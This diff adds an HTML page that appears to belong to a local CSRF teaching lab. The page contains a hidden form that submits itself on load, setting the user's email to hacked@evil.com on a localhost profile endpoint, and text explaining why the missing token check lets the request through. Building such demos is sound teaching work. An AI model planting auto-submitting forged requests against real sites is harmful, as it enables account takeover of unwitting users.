@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>🎣 Attacker Page – POST CSRF</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #1a0a0a;
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .attack-card {
+      background: #2a1515;
+      border: 2px solid #e74c3c;
+      border-radius: 12px;
+      padding: 2.5rem;
+      max-width: 600px;
+      text-align: center;
+    }
+    .attack-card h1 {
+      color: #e74c3c;
+      margin-bottom: 1rem;
+      font-size: 1.8rem;
+    }
+    .attack-card p {
+      line-height: 1.7;
+      margin-bottom: 1rem;
+    }
+    code {
+      background: #0d0f14;
+      padding: .15rem .4rem;
+      border-radius: 4px;
+      font-family: 'Fira Code', 'Consolas', monospace;
+      font-size: .85rem;
+      color: #e74c3c;
+    }
+    .note {
+      margin-top: 1.5rem;
+      padding: .75rem 1rem;
+      background: #1a2a1a;
+      border: 1px solid #2ecc71;
+      border-radius: 6px;
+      font-size: .9rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="attack-card">
+    <h1>🎣 Attacker Page – POST CSRF</h1>
+    <p>
+      This page silently submits a <strong>hidden form</strong> to
+      <code>http://127.0.0.1:5005/profile</code> using the POST method.<br>
+      The browser automatically includes your session cookie with the request.
+    </p>
+    <p>
+      Since the vulnerable endpoint does <em>not</em> check for a CSRF token,
+      the server accepts the forged request and <strong>changes your email</strong>
+      to <code>hacked@evil.com</code>.
+    </p>
+
+    <!-- Hidden auto-submitting CSRF form -->
+    <form id="csrf-form" method="POST" action="http://127.0.0.1:5005/profile" style="display:none;">
+      <input type="hidden" name="email" value="hacked@evil.com">
+    </form>
+    <script>document.getElementById('csrf-form').submit();</script>
+
+    <p style="margin-top:1.5rem;">
+      ✅ Check the <a href="http://127.0.0.1:5005/profile" style="color:#e74c3c;">vulnerable profile</a>
+      — your email is now <code>hacked@evil.com</code>.
+    </p>
+
+    <div class="note">
+      <strong>Note:</strong> The <a href="http://127.0.0.1:5005/profile-secure" style="color:#2ecc71;">secure endpoint</a>
+      would reject this request with a <strong>403 Forbidden</strong> because the CSRF token is missing.
+    </div>
+  </div>
+
+</body>
+</html>
